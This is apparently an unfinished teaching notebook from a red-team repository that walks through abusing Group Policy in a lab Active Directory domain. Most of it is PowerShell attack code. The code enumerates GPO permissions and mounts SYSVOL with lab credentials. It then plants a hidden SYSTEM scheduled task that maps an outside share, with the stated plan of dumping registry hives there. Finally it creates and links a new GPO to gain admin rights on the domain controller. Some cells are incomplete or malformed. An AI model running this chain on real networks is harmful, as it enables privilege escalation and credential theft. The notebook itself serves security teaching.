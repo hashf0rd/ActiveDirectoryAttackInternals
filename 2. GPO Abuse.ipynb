{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## GPO Overview\n",
    "Group Policy is a mechanism for deploying computer and user specific configuration across multiple machines within a network. Another way to think of Group Policy is in its name - configuration policies applied to groups of users and computers. These configuration policies, or GPOs, are stored both as a collection of files on a network share, and as an object within Active Directory.\n",
    "\n",
    "The network share where group policy files are stored is known as SYSVOL, and each GPO  has a specifc folder on this share, referred to as the Group Policy Template or GPT. The contents of the GPT are replicated across all domain controllers in the domain, so feasibly all DCs should have the copy of the same GPOs files. The GPT is where the majority of the configuration policies listed in a GPO will be stored. \n",
    "\n",
    "The AD object for the GPO is called the Group Policy Container or GPC. The GPC contains information such as version of the GPO, whether it is disabled, and XXXXXXXXXXXX\n",
    "\n",
    "Both the portion of the GPO that is stored on the SYSVOL share (its GPT) and the portion stored as an AD object (its GPC) are named with a unique 128-bit GUID. This is separate from the human readable 'friendly' name and means the GPO will always be unique identifiable within the domain. However, this GUID 'name' is similar across Active Directory deployments, so GPOs also have a second, globally unique 128-bit GUID."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## GPO Recon\n",
    "Imagine we have acces to this account"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$dirEntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://dc01.gpoabuse.lab\", \"gpoabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "$searcher = New-Object System.DirectoryServices.DirectorySearcher($dirEntry)\n",
    "$searcher.Filter = \"(&(objectCategory=user)(samAccountName=john.dee))\"\n",
    "$results = $searcher.FindOne()\n",
    "$results.Properties.distinguishedname\n",
    "\"Groups:\"\n",
    "foreach ($group in $($results.Properties.memberof)) {\n",
    "    \"    $group\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Get SID of users group"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$searcher.Filter = \"(&(objectCategory=group)(cn=Office Admins))\"\n",
    "$results = $searcher.FindOne()\n",
    "$groupSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$results.Properties.objectsid[0],0))\n",
    "$groupSID.Value"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Check what GPOs this group has access to"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$searcher.Filter = \"(objectCategory=groupPolicyContainer)\"\n",
    "$searcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl\n",
    "$groupPolicyObjects = $searcher.FindAll() \n",
    "\n",
    "foreach ($gpo in $groupPolicyObjects) {\n",
    "    # Get the ACL from the binary nTSecurityDescriptor property\n",
    "    $SecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity\n",
    "    $SecurityDescriptor.SetSecurityDescriptorBinaryForm([Byte[]]$gpo.Properties[\"nTSecurityDescriptor\"][0])\n",
    "    $gpoACL = $SecurityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])\n",
    "\n",
    "    # Iterate through the ACLs of each GPO, looking for the targetSID\n",
    "    foreach ($ace in $gpoACL) {\n",
    "        if ($ace.IdentityReference.CompareTo($groupSID) -eq 0) {\n",
    "            $gpoDN = $gpo.Properties.distinguishedname\n",
    "            $gpoDisplayName = $gpo.Properties.displayname\n",
    "            $gpoPath = $gpo.Properties.adspath\n",
    "            Write-Host \"$($ace.AccessControlType) -> $($ace.ActiveDirectoryRights) on GPO '$gpoDisplayName'\"\n",
    "        }\n",
    "    }\n",
    "}\n",
    "$dirEntry.Dispose()\n",
    "$groupPolicyObjects.Dispose()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "GPO linking - examine how this GPO is linked to the OU, meaning it will apply to all machines in that OU. gpLink is an attribute on the OU object, not the GPO."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$dirEntry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://dc01.gpoabuse.lab\", \"gpoabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "$searcher = New-Object System.DirectoryServices.DirectorySearcher($dirEntry)\n",
    "$searcher.Filter = \"(objectCategory=organizationalUnit)\"\n",
    "$ouResult = $searcher.FindAll()\n",
    "ForEach ($ou in $ouResult) {\n",
    "    if (($ou.Properties.gplink) -match $gpoDN) {\n",
    "        \"'$gpoDisplayName' is linked to $($ou.Properties.name)\"\n",
    "    }\n",
    "}\n",
    "\n",
    "$dirEntry.Dispose()\n",
    "$ouResult.Dispose()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "GPC Internals - examine the GPO\n",
    "\n",
    "GPOs have a name which is a GUID inside curly braces. These are the same in across Active Directory environments, so GPOs also have a globally unique objectGUID. The GPT for a GPO is named after the 'name' GUID"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$gpoEntry = New-Object System.DirectoryServices.DirectoryEntry($gpoPath, \"gpoabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "$gpoEntry | Format-List name, distinguishedname, @{ n='objectGUID'; e={New-Object System.Guid($_.objectGUID)} }, objectCategory, gPCFileSysPath, versionnumber\n",
    "$gpoGUID = $gpoEntry.Properties['name']\n",
    "$gpoGUID"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Mount sysvol as if we were a domain joined machine - opsec consideration that this mount is not done with a machine account??"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "New-SmbMapping -Localpath \"Z:\" -RemotePath \"\\\\dc01.gpoabuse.lab\\SysVol\\gpoabuse.lab\\Policies\" -UserName \"gpoabuse\\gpoAdmin\" -Password \"gpoPass01\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we have this mounted we can examine the GPO files contained in the GPT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "Set-Location Z:\\$gpoGUID\n",
    "Get-ChildItem ."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Talk about what each file means broadly\n",
    "\n",
    "ini - config\n",
    "cmt - comments\n",
    "user/registry.pol - user registry settings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "\"Office Admins SID: $($groupSID.Value)`n\"\n",
    "\n",
    "Write-Host -NoNewLine \"=== Z:\\$gpoGUID ===\" \n",
    "(Get-ACL Z:\\$gpoGUID).Access | where { $_.IdentityReference -match $groupSID } | Format-List -Property FileSystemRights, AccessControlType, IdentityReference, IsInherited\n",
    "\n",
    "ForEach ($item in Get-Childitem Z:\\$gpoGUID) {\n",
    "    Write-Host -NoNewLine \"=== $item ===\"\n",
    "    (Get-ACL $item).Access | where { $_.IdentityReference -match $groupSID } | Format-List -Property FileSystemRights, AccessControlType, IdentityReference, IsInherited\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "See we have write on these files!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$literalPath = Get-Location\n",
    "$cmt = [System.Text.Encoding]::Unicode.GetString([System.IO.File]::ReadAllBytes(\"$literalPath\\GPO.cmt\"))\n",
    "$regBytes = [System.IO.File]::ReadAllBytes(\"$literalPath\\User\\Registry.pol\")\n",
    "$signature = [System.Text.Encoding]::ASCII.GetString($regBytes[0..3])\n",
    "$version = [System.BitConverter]::ToInt32($regBytes, 4)\n",
    "$regEntries = [System.Text.Encoding]::Unicode.GetString($regBytes[8..($regBytes.Length-1)]) -replace '[\\x00-\\x1F]', ' ' -replace '\\s+', ' '"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "Write-Host \"`n=== GPT.INI ===`n\" \n",
    "Get-Content \"$literalPath\\GPT.INI\"\n",
    "Write-Host \"`n=== GPO.cmt ===`n\"\n",
    "Write-Host $cmt\n",
    "Write-Host \"`n=== Registry.pol ===`n\"\n",
    "Write-Host \"Header Information:\"\n",
    "Write-Host \"Signature: $signature\"\n",
    "Write-Host \"Version: $version\"\n",
    "Write-Host \"`nRegistry Entries:\"\n",
    "Write-Host $regEntries"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Talk about contents - need some tidier code to enum the GPO\n",
    "\n",
    "Explain we will modify this GPO to run a scheduled task to dump hives and move them to a share, that the GPO will also mount\n",
    "\n",
    "Show that the share has been setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "Get-SmbShare -Name tmpPrinter\n",
    "(Get-NetIPAddress -InterfaceAlias *gpoabuse*).IPAddress"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Modifying a GPO by hand"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$command = \"net use z: \\\\192.168.6.1\\tmpPrinter /user:printUser /password:printerPass01\"\n",
    "\n",
    "$TaskXML = [XML]'<?xml version=\"1.0\" encoding=\"utf-8\"?>\n",
    "<ScheduledTasks clsid=\"{CC63F200-7309-4ba0-B154-A71CD118DBCC}\">\n",
    "<ImmediateTaskV2 clsid=\"{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}\" uid=\"{E9B78FAC-9BF4-44F2-B83E-AC10C7BCE7E6}\" changed=\"2025-01-01 00:00:00\" image=\"0\" name=\"addCreds\">\n",
    "    <Properties name=\"addCreds\" runAs=\"NT Authority\\SYSTEM\" action=\"C\">\n",
    "        <Task version=\"1.3\">\n",
    "            <RegistrationInfo>\n",
    "                <Author>NT Authority\\SYSTEM</Author>\n",
    "                <Description></Description>\n",
    "            </RegistrationInfo>\n",
    "            <Principals>\n",
    "                <Principal id=\"Author\">\n",
    "                    <UserId>NT AUTHORITY\\System</UserId>\n",
    "                    <RunLevel>HighestAvailable</RunLevel>\n",
    "                    <LogonType>S4U</LogonType>\n",
    "                </Principal>\n",
    "            </Principals>\n",
    "            <Settings>\n",
    "                <IdleSettings>\n",
    "                    <Duration>PT10M</Duration>\n",
    "                    <WaitTimeout>PT1H</WaitTimeout>\n",
    "                    <StopOnIdleEnd>true</StopOnIdleEnd>\n",
    "                    <RestartOnIdle>false</RestartOnIdle>\n",
    "                </IdleSettings>\n",
    "                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n",
    "                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n",
    "                <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n",
    "                <AllowHardTerminate>false</AllowHardTerminate>\n",
    "                <StartWhenAvailable>true</StartWhenAvailable>\n",
    "                <AllowStartOnDemand>false</AllowStartOnDemand>\n",
    "                <Enabled>true</Enabled>\n",
    "                <Hidden>true</Hidden>\n",
    "                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n",
    "                <Priority>7</Priority>\n",
    "                <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>\n",
    "                <RestartOnFailure>\n",
    "                    <Interval>PT15M</Interval>\n",
    "                    <Count>3</Count>\n",
    "                </RestartOnFailure>\n",
    "            </Settings>\n",
    "            <Actions Context=\"Author\">\n",
    "                <Exec>\n",
    "                    <Command>cmd.exe</Command>\n",
    "                    <Arguments>$command</Arguments>\n",
    "                </Exec>\n",
    "            </Actions>\n",
    "            <Triggers>\n",
    "                <TimeTrigger>\n",
    "                    <StartBoundary>%LocalTimeXmlEx%</StartBoundary>\n",
    "                    <EndBoundary>%LocalTimeXmlEx%</EndBoundary>\n",
    "                    <Enabled>true</Enabled>\n",
    "                </TimeTrigger>\n",
    "            </Triggers>\n",
    "        </Task>\n",
    "    </Properties>\n",
    "</ImmediateTaskV2>\n",
    "</ScheduledTasks>'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$scheduledTaskPath = \"$literalPath\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\"\n",
    "Set-Content -Path $scheduledTaskPath -Value $TaskXML -Encoding ASCII\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$gpoEntry | Format-List gPCMachineExtensionName"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "$gptINI = \"$literalPath\\GPT.INI\"\n",
    "Set-Content -Path $gptINI -Value $((Get-Content $gptINI) -replace \"Version=\\d+\", \"Version=1337\")\n",
    "\n",
    "$gpoEntry.versionNumber = 1337\n",
    "$gpoEntry.CommitChanges()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$gpoEntry = New-Object System.DirectoryServices.DirectoryEntry($gpoPath, \"gpoabuse.lab\\john.dee\", \"johnsPass01\")\n",
    "$gpoEntry.versionNumber"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Once the GPO has been modified, we will force a gpupdate, and show the share now has the registry hives in it"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "hand waving at this point - we just can rather than show that the hives contained creds for the user jim.duggan, examining jims account shows he is part of the site policy admins group"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$credential = New-Object PSCredential(\"gpoabuse.lab\\jim.duggan\", $(ConvertTo-SecureString \"jimsPass01\" -AsPlainText -Force))\n",
    "Invoke-Command -ComputerName ws01.gpoabuse.lab -ScriptBlock { \n",
    "    whoami /all \n",
    "} -Credential $credential"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "do some recon to show site policy admins can link against the site Dunwhich, then do some recon to show the DC is in that site"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "Invoke-Command -ComputerName ws01.gpoabuse.lab -ScriptBlock { \n",
    "    Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property DisplayName, State \n",
    "} -Credential $credential"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "Invoke-Command -ComputerName ws01.gpoabuse.lab -ScriptBlock {\n",
    "    Get-ADObject -LDAPFilter \"(objectClass=site)\"\n",
    "} -Credential $credential "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "New GPO to add jim duggan to the local admins restricted group on the DC, which is then linked to the site"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "New-GPO -Name \"PrinterUpdate\" -Domain \"gpoabuse.lab\" -DC \"dc01.gpoabuse.lab\" -Credential $credential\n",
    "\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\n",
    "Set-GPLink -Target \"Dunwhich\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "PWNED"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$credential = New-Object PSCredential(\"gpoabuse.lab\\jim.duggan\", $(ConvertTo-SecureString \"jimsPass01\" -AsPlainText -Force))\n",
    "Invoke-Command -ComputerName dc01.gpoabuse.lab -ScriptBlock { whoami /all } -Credential $credential"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Futher Reading\n",
    "\n",
    "MS docs on how group policy works:\n",
    "- [Group Policy Architecture](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-architecture)\n",
    "- [Mapped Drives XML](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/1b0df77e-9f78-4be0-b55a-988ac916b425)\n",
    "- [Scheduled Tasks XML](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/850b333b-9336-496a-bf93-a20f33748454)\n",
    "- [GPO Extension List](https://learn.microsoft.com/en-gb/archive/blogs/mempson/group-policy-client-side-extension-list)\n",
    "\n",
    "Some excellent sources for understandng GPO internals: \n",
    "- [A Red Teamers Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)\n",
    "- [GPO Abuse Part 1](https://web.archive.org/web/20200109143823/https://rastamouse.me/2019/01/gpo-abuse-part-1/)\n",
    "- [GPO Abuse Part 2](https://web.archive.org/web/20200330100149/http://rastamouse.me/2019/01/gpo-abuse-part-2/)\n",
    "- [Exploitating Windows Group Policy for Reconnaissance and Attack](https://www.youtube.com/watch?v=eoBeRkpj6TE)\n",
    "- [Understanding Group Policy Storage](https://sdmsoftware.com/whitepapers/understanding-group-policy-storage/)\n",
    "\n",
    "A nice overview of GPO persistence:\n",
    "- [Sneaky Active Directory Persistence #17: Group Policy](https://adsecurity.org/?p=2716)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "name": "python",
   "version": "3.12.3"
  },
  "polyglot_notebook": {
   "kernelInfo": {
    "defaultKernelName": "csharp",
    "items": [
     {
      "aliases": [],
      "name": "csharp"
     }
    ]
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
